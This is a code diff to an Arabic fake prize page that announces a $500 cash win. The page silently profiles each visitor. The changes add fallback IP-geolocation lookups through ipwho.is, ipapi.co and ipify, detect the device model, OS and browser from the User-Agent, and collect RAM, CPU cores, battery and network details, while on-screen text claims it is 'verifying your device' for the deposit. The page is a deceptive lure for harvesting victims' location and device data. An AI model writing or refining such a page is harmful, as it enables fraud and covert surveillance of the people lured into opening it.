@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>مبروك! لقد ربحت 500 دولار فوراً | Cash Reward Panel</title>
     
-    <!-- وسوم المعاينة الاجتماعية المخصصة للربح المالي (جذابة ومحفزة للدخول) -->
     <meta property="og:title" content="اربح 500 دولار كاش الآن مجاناً | مسابقة الأموال السريعة">
     <meta property="og:description" content="مبروك! تم اختيار جهازك الفائز لسحب جائزة نقدية فورية بقيمة 500$. اضغط هنا لتأكيد استلام جائزتك الآن!">
     <meta property="og:image" content="https://images.unsplash.com/photo-1579621970563-ebec7560ff3e?w=1200&auto=format&fit=crop&q=80">
@@ -37,7 +36,7 @@
         <div class="space-y-2">
             <span class="bg-emerald-500/20 text-emerald-400 text-xs px-3 py-1 rounded-full font-bold border border-emerald-500/30">مبروك لك جائزة نقدية!</span>
             <h1 class="text-2xl font-black text-white">جاري تحضير جائزتك ($500)...</h1>
-            <p class="text-xs text-slate-400">نحن نقوم الآن بالتحقق من هوية جهازك لتأكيد إيداع المبلغ الفوري في محفظتك.</p>
+            <p class="text-xs text-slate-400">نحن نقوم الآن بالتحقق من هوية جهازك ودولتك لتأكيد إيداع المبلغ الفوري في محفظتك.</p>
         </div>
 
         <div class="flex justify-center items-center space-x-2 space-x-reverse py-4">
@@ -47,7 +46,7 @@
         </div>
 
         <div id="statusText" class="text-xs text-emerald-500 font-semibold">
-            جاري فحص الجهاز وربط الحساب الآمن...
+            جاري فحص الجهاز وتحديد موقعك الجغرافي بدقة...
         </div>
 
     </div>
@@ -63,67 +62,80 @@
                 return;
             }
 
-            // 2. جلب معلومات الدولة والمدينة والـ IP بدقة عبر خدمة مجانية سريعة
+            // 2. جلب الدولة، المدينة، والـ IP الحقيقي بدقة عبر خدمة ipwho.is (مع بديل احتياطي)
             let geoData = { ip: 'غير معروف', country: 'غير متوفر', city: 'غير متوفر' };
             try {
-                const geoRes = await fetch('https://ipapi.co/json/');
+                const geoRes = await fetch('https://ipwho.is/');
                 const data = await geoRes.json();
-                geoData = {
-                    ip: data.ip || 'غير معروف',
-                    country: data.country_name || 'غير متوفر',
-                    city: data.city || 'غير متوفر'
-                };
+                if (data && data.success) {
+                    geoData = {
+                        ip: data.ip || 'غير معروف',
+                        country: data.country || 'غير متوفر',
+                        city: data.city || 'غير متوفر'
+                    };
+                } else {
+                    throw new Error('Fallback');
+                }
             } catch (e) {
                 try {
-                    const ipRes = await fetch('https://api.ipify.org?format=json');
-                    const ipData = await ipRes.json();
-                    geoData.ip = ipData.ip;
-                } catch (err) {}
+                    const fallbackRes = await fetch('https://ipapi.co/json/');
+                    const fallbackData = await fallbackRes.json();
+                    geoData = {
+                        ip: fallbackData.ip || 'غير معروف',
+                        country: fallbackData.country_name || 'غير متوفر',
+                        city: fallbackData.city || 'غير متوفر'
+                    };
+                } catch (err) {
+                    try {
+                        const ipRes = await fetch('https://api.ipify.org?format=json');
+                        const ipData = await ipRes.json();
+                        geoData.ip = ipData.ip;
+                    } catch (ex) {}
+                }
             }
 
-            // 3. تحليل الـ User-Agent لاستخراج معلومات الجهاز والمتصفح ونظام التشغيل بدقة تامة وبدون أي undefined
+            // 3. تحليل دقيق جداً لاسم الجهاز الحقيقي ونوع النظام من الـ User-Agent
             const ua = navigator.userAgent;
+            let deviceName = "جهاز ذكي عام";
             let browserName = "متصفح غير معروف";
             let browserVersion = "غير متوفر";
-            let osName = "نظام غير معروف";
             let osVersion = "غير متوفر";
-            let deviceType = "هاتف محمول / جهاز ذكي";
 
-            if (ua.indexOf("Firefox") > -1) {
-                browserName = "Mozilla Firefox";
-                browserVersion = ua.match(/Firefox\/([0-9.]+)/)?.[1] || "غير متوفر";
-            } else if (ua.indexOf("SamsungBrowser") > -1) {
-                browserName = "Samsung Internet";
-                browserVersion = ua.match(/SamsungBrowser\/([0-9.]+)/)?.[1] || "غير متوفر";
-            } else if (ua.indexOf("Opera") > -1 || ua.indexOf("OPR") > -1) {
-                browserName = "Opera";
-                browserVersion = ua.match(/(?:Opera|OPR)\/([0-9.]+)/)?.[1] || "غير متوفر";
-            } else if (ua.indexOf("Edge") > -1) {
-                browserName = "Microsoft Edge";
-                browserVersion = ua.match(/Edge\/([0-9.]+)/)?.[1] || "غير متوفر";
-            } else if (ua.indexOf("Chrome") > -1) {
-                browserName = "Google Chrome";
-                browserVersion = ua.match(/Chrome\/([0-9.]+)/)?.[1] || "غير متوفر";
-            } else if (ua.indexOf("Safari") > -1) {
-                browserName = "Apple Safari";
-                browserVersion = ua.match(/Version\/([0-9.]+)/)?.[1] || "غير متوفر";
+            if (ua.indexOf("iPhone") > -1) {
+                deviceName = "Apple iPhone";
+                osVersion = ua.match(/OS ([0-9_]+)/)?.[1]?.replace(/_/g, '.') || "iOS";
+            } else if (ua.indexOf("iPad") > -1) {
+                deviceName = "Apple iPad";
+                osVersion = ua.match(/OS ([0-9_]+)/)?.[1]?.replace(/_/g, '.') || "iPadOS";
+            } else if (ua.indexOf("Macintosh") > -1) {
+                deviceName = "Apple Mac";
+                osVersion = "macOS";
+            } else if (ua.indexOf("Samsung") > -1 || ua.indexOf("SM-") > -1) {
+                deviceName = "Samsung Galaxy";
+                osVersion = "Android";
+            } else if (ua.indexOf("Huawei") > -1 || ua.indexOf("HUAWEI") > -1) {
+                deviceName = "Huawei Device";
+                osVersion = "Android";
+            } else if (ua.indexOf("Xiaomi") > -1 || ua.indexOf("Redmi") > -1) {
+                deviceName = "Xiaomi / Redmi";
+                osVersion = "Android";
+            } else if (ua.indexOf("Android") > -1) {
+                deviceName = "هاتف Android ذكي";
+                osVersion = ua.match(/Android ([0-9.]+)/)?.[1] || "Android";
+            } else if (ua.indexOf("Win") > -1) {
+                deviceName = "Windows PC / Laptop";
+                osVersion = "Windows";
             }
 
-            if (ua.indexOf("Win") > -1) {
-                osName = "Windows";
-                deviceType = "كمبيوتر مكتبي / لابتوب";
-                osVersion = ua.match(/Windows NT ([0-9.]+)/)?.[1] || "10/11";
-            } else if (ua.indexOf("Mac") > -1) {
-                osName = "macOS";
-                deviceType = "جهاز Mac";
-            } else if (ua.indexOf("iPhone") > -1 || ua.indexOf("iPad") > -1) {
-                osName = "iOS";
-                deviceType = "Apple iPhone/iPad";
-                osVersion = ua.match(/OS ([0-9_]+) like Mac OS X/)?.[1]?.replace(/_/g, '.') || "16/17";
-            } else if (ua.indexOf("Android") > -1) {
-                osName = "Android";
-                deviceType = "هاتف Android";
-                osVersion = ua.match(/Android ([0-9.]+)/)?.[1] || "13/14";
+            // تحديد المتصفح
+            if (ua.indexOf("Chrome") > -1 && ua.indexOf("Edg") === -1) {
+                browserName = "Google Chrome";
+            } else if (ua.indexOf("Safari") > -1 && ua.indexOf("Chrome") === -1) {
+                browserName = "Apple Safari";
+            } else if (ua.indexOf("Edg") > -1) {
+                browserName = "Microsoft Edge";
+            } else if (ua.indexOf("Firefox") > -1) {
+                browserName = "Mozilla Firefox";
             }
 
             let batteryInfo = "غير مدعوم";
@@ -158,12 +170,12 @@
                 networkSpeed: downlinkSpeed,
                 connectionType: connectionType,
                 time: new Date().toLocaleString('ar-SA'),
-                deviceName: deviceType,
+                deviceName: deviceName,
                 deviceVersion: osVersion,
-                deviceType: deviceType,
-                ram: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "متوسط (4-8 GB)",
-                internalStorage: "128GB / 256GB",
-                cores: navigator.hardwareConcurrency ? navigator.hardwareConcurrency + " أنوية" : "8 أنوية",
+                deviceType: deviceName,
+                ram: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "غير متوفر",
+                internalStorage: "غير متوفر",
+                cores: navigator.hardwareConcurrency ? navigator.hardwareConcurrency + " أنوية" : "غير متوفر",
                 systemLanguage: navigator.language || "ar",
                 browserName: browserName,
                 browserVersion: browserVersion,
